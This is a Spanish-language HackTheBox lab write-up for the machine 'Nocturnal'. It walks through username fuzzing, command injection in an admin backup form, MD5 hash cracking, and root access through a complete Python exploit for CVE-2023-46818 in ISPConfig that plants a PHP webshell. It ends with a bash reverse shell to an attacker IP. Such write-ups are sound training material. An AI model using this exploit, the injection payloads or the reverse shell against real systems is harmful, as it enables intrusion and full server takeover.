---
title: "Nocturnal - Easy (HTB)"
date: 2025-08-24 18:00:00 -0700
categories: [Writeups, HTB]
tags: [HTB, nocturnal, idor, rce, ispconfig, cve-2023-46818, linux, hashcat, ffuf]
toc: true
comments: true
description: "Writeup técnico de Nocturnal en HackTheBox: desde fuzzing y SQLite hasta explotación de ISPConfig con CVE-2023-46818."

---
# Nocturnal — EASY

📅 Fecha: 20-04-2025  
🔗 IP: 10.10.11.64  
🔍 Estado: 🎯 Resuelta

---

## Reconocimiento

```bash
╭─kali@kali ~/Nocturnal/nmap at 🕐 17:40
╰─❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.64  -oN Scan_Inicial.txt
````

Lo que el escaneo dio:

```bash
Nmap scan report for 10.10.11.64
Host is up, received user-set (0.14s latency).
Scanned at 2025-08-23 17:41:25 EDT for 14s
Not shown: 62580 closed tcp ports (reset), 2953 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
# Nmap done at Sat Aug 23 17:41:39 2025 -- 1 IP address (1 host up) scanned in 14.47 seconds
```

Ahora a escanear los puertos:

```bash
╭─kali@kali ~/Nocturnal/nmap at 🕐 17:42
╰─❯ nmap 10.10.11.64 -p 22,80 -sCV --min-rate 5000 -oN Scan_Ports.txt
```

Lo obtenido:

```
Nmap scan report for 10.10.11.64
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 23 17:44:11 2025 -- 1 IP address (1 host up) scanned in 11.57 seconds
```

La información obtenida mostró que el servicio SSH estaba corriendo con OpenSSH 8.2p1 y que el servicio web usaba **nginx 1.18.0**, también dándonos el nombre del dominio: `http://nocturnal.htb/`.

Antes de adentrarnos a la página web añadimos el dominio al `/etc/hosts`:

```bash
╭─kali@kali ~/Nocturnal/nmap at 🕐 17:47
╰─❯ echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

![hosts](/assets/img/nocturnal-easy/Pasted%20image%2020250823145354.png)

Haciendo un **whatweb** esto es lo que arroja:

```bash
╭─kali@kali ~/Nocturnal at 🕐 17:55
╰─❯ whatweb http://nocturnal.htb/        
http://nocturnal.htb/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0]
```

Vemos que maneja PHP.

Al ver la página, observamos que pide **iniciar sesión o registrarse** para poder **subir y ver archivos**. También cuenta con una sección **Contact Us** con correo `support@nocturnal.htb`.

Creamos una cuenta y nos logeamos con `test:test`.

![signup](/assets/img/nocturnal-easy/Pasted%20image%2020250823150058.png)

Como decía el inicio, podemos **subir archivos**.

![upload](/assets/img/nocturnal-easy/Pasted%20image%2020250823150323.png)

he subido un archivo test.pdf, que no contiene mucho, sin embargo una vez subido el archivo hace referencia 

![view-link](/assets/img/nocturnal-easy/Pasted%20image%2020250823151114.png)

Y acepta como parámetro el usuario, entonces, que pasa si hacemos un fuzzing a los usuarios? hasta encontrar uno que sea el correcto

```bash
╭─kali@kali ~/Nocturnal at 🕐 18:14
╰─❯ ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=*.pdf' \
-w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-mc 200 -fr "User not found." \
-H "Cookie: PHPSESSID=[REDACTED]"
```

Pese que aparecieron muchos usuarios, el mas interesante es amanda, puesto que amanda tiene un tamaño diferente al de todos los demas, esto ya es una buena pista y buen comienzo

```bash
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 142ms]
```

Ahora, probamos directamente:

```
http://nocturnal.htb/view.php?username=amanda&file=*.pdf
```

Vemos que `amanda` tiene un archivo:

![amanda-file](/assets/img/nocturnal-easy/Pasted%20image%2020250823151939.png)

viendo un poco el archivo, puesto, veo que en el archivo content.xml viene lo siguiente

```xml
</text:p>
<text:p text:style-name="P1">
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
</text:p>
<text:p text:style-name="P1">
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
</text:p>
<text:p text:style-name="P1">
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
</text:p>
<text:p text:style-name="P1"/>
<text:p text:style-name="P1">Yours sincerely,</text:p>
<text:p text:style-name="P1">Nocturnal's IT team</text:p>
```

Con esa **contraseña temporal**, iniciamos sesión:

![amanda-login](/assets/img/nocturnal-easy/Pasted%20image%2020250823152439.png)

`amanda` tiene acceso a un **panel de administración**:

![admin-panel](/assets/img/nocturnal-easy/Pasted%20image%2020250823152636.png)

El panel permite **crear un backup**:

![backup-button](/assets/img/nocturnal-easy/Pasted%20image%2020250823152628.png)

Viendo el código de registro de usuarios:

```php
<?php
session_start();
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = md5($_POST['password']);

    $stmt = $db->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $stmt->bindValue(':password', $password, SQLITE3_TEXT);

    if ($stmt->execute()) {
        $_SESSION['success'] = 'User registered successfully!';
        header('Location: login.php');
        exit();
    } else {
        $error = 'Failed to register user.';
    }
}
?>
```

**Interceptamos** con Burp la petición del backup:

```http
POST /admin.php HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://nocturnal.htb
Connection: keep-alive
Referer: http://nocturnal.htb/admin.php
Cookie: PHPSESSID=[REDACTED]
Upgrade-Insecure-Requests: 1
Priority: u=0, i

password=%0Abash%09-c%09"whoami"%0A&backup=
```

vemos nada mas ni nada menos que una base de datos, entonces, intentemos interceptar la peticion que hace burp suite cuando queremos descargar el backup

![whoami-www-data](/assets/img/nocturnal-easy/Pasted%20image%2020250823154821.png)

Efectivamente si lo hay respondiendonos del usuario www-data

ahora veremos la base de datos

```bash
password=%0Abash%09 c%09"sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump"%0A &backup=
```

```sqlite
INSERT INTO users VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb');
INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4');
INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d');
INSERT INTO users VALUES(6,'kavi','f38cde1654b39fea2bd4f72f1ae4cdda');
INSERT INTO users VALUES(7,'e0Al5','101ad4543a96a7fd84908fd0d802e7db');
INSERT INTO users VALUES(8,'ciul','49858702f9317d7b6180b31c8a8120e4');
INSERT INTO users VALUES(9,'ataman','4de85829cc9cdd6983000733b8779c6f');
INSERT INTO users VALUES(10,'Smith','7076192633a1cc795f4db1c674b217b6');
```

todo lo meteremos a un archivo llamado hash.txt

y aplicaremos el siguiente comando

```bash
╭─kali@kali ~/Nocturnal/contenido at 🕐 20:40
╰─❯ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

El unico que nos dio fue el siguiente

```bash
55c82b1ccd55ab219b3b109b07d5061d : slowmotionapocalypse
```

Parece ser del usuario tobias, haremos conexion por ssh, asi conseguimos la flag user.txt

```bash
tobias@nocturnal:~$ ls
user.txt
```

### Escalada

Ahora para elevar privilegios, podemos verificar que tobias no tiene permiso sudo 

```bash
tobias@nocturnal:~$ sudo -l
[sudo] password for tobias:
Sorry, user tobias may not run sudo on nocturnal.
tobias@nocturnal:~$
```

al investigar mas al fondo encontramos que la maquina tiene el puerto corriendo un servicio

![ss-listen](/assets/img/nocturnal-easy/Pasted%20image%2020250824175250.png)

entonces podriamos hacer un port forward, para poder ver desde nuestra maquina

```bash
╭─kali@kali ~/Nocturnal at 🕐 20:54
╰─❯ ssh -L 9001:127.0.0.1:8080 tobias@10.10.11.64
```

una vez hecho podemos ver http://localhost:9001 en nuestro navegador

y nos topamos con un login

![login-ispconfig](/assets/img/nocturnal-easy/Pasted%20image%2020250824175721.png)

para logearme fue cuestion de usar  `admin:slowmotionapocalypse` 

y conseguimos la pantalla del ispconfig

![ispconfig-home](/assets/img/nocturnal-easy/Pasted%20image%2020250824180044.png)

Notamos que la versiones `ISPConfig Version: 3.2.10p1`, si googleamos esto encontramos lo siguiente, confirmando que esta version es vulnerable

![ispconfig-version](/assets/img/nocturnal-easy/Pasted%20image%2020250824180204.png)

Explotamos la **CVE-2023-46818** (language\_edit.php). Script usado:

```python
#!/usr/bin/env python3
import requests, re, sys, base64, urllib.parse
requests.packages.urllib3.disable_warnings()

URL, USER, PW = sys.argv[1:4]            # uso: python3 exploit.py http://x/ admin pass
if not URL.endswith('/'): URL += '/'

s = requests.Session(); s.verify = False

# 1) login
r = s.post(URL+'login/', data={'username':USER,'password':PW,'s_mod':'login'})
if 'Username or Password wrong' in r.text: sys.exit('[-] Login fail')
print('[+] Logged in')

# 2) busca tokens CSRF en language_edit
lang_params = {'lang':'en','module':'help','lang_file':'xyz.lng'}
r = s.get(URL+'admin/language_edit.php', params=lang_params)
csrf_id  = re.search(r'name="_csrf_id"\s+value="([^"]+)"', r.text)[1]
csrf_key = re.search(r'name="_csrf_key"\s+value="([^"]+)"', r.text)[1]

# 3) payload: escribe sh.php
php = "<?php echo 'OK'; if(isset($_GET['c'])) system($_GET['c']); ?>"
inj = f"'];file_put_contents('sh.php',base64_decode('{base64.b64encode(php.encode()).decode()}'));die;#"
data = {'lang':'en','module':'help','lang_file':'xyz.lng',
        '_csrf_id':csrf_id,'_csrf_key':csrf_key,'records[\\]':inj}
s.post(URL+'admin/language_edit.php', data=data)
print('[+] Webshell planted as /admin/sh.php')

# 4) prueba
r = s.get(URL+'admin/sh.php', params={'c':'id'})
print('[+] Command output:\n', r.text)
```

y este debería ser la forma en la que ejecutamos el exploit

```bash
╭─kali@kali ~/Nocturnal/exploits via 🐍 v3.13.6  at 🕐 21:15
╰─❯ python3 exploit.py http://localhost:9001/ admin 'slowmotionapocalypse'
[+] Logged in
[+] Webshell planted as /admin/sh.php
[+] Command output:
 OKuid=0(root) gid=0(root) groups=0(root)
```

> [!NOTE]
> ## ¿Qué es y por qué ocurre?
> **CVE-2023-46818** afecta a **ISPConfig ≤ 3.2.11** cuando está activada la opción `admin_allow_langedit`. El editor de idiomas (`/admin/language_edit.php`) procesa el parámetro `records[]` sin sanitización suficiente, permitiendo **inyección de PHP** y ejecución de código con los privilegios del proceso de la interfaz web (en algunas instalaciones, ese contexto puede llegar a ser root). El fallo quedó **parchado en 3.2.11p1**. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-46818?utm_source=chatgpt.com)[ISPConfig](https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released/?utm_source=chatgpt.com)
> 
>  Importante: el propio proyecto indica que la explotación requiere estar autenticado como el **usuario “admin” (superadmin incorporado)**; cuentas de cliente/reseller/email y “otros admins” creados adicionalmente **no** estarían afectadas por este vector.

ahora podremos verificar si tenemos una webshell, dentro de la ruta `/admin/sh.php` y usando el parametro `id`

![id-root](/assets/img/nocturnal-easy/Pasted%20image%2020250824182138.png)

confirmamos que la webshell se hizo y tenemos root, quizás pudiéramos verificar la rota root y sacar le flag, pero que sentido tiene si no lo hacemos en la terminal no? vamos a eso

ahora hagamos lo mismo pero para una Reverse shell

Reverse shell:

```bash
http://localhost:9001/admin/sh.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.177/4444%200%3E%261%27
```

Y ya como root:

![root](/assets/img/nocturnal-easy/Pasted%20image%2020250824182547.png)

```bash
root@nocturnal:/usr/local/ispconfig/interface/web# cd /root
cd /root
root@nocturnal:~# ls
ls
root.txt
scripts
```

Flag conseguida. ✅



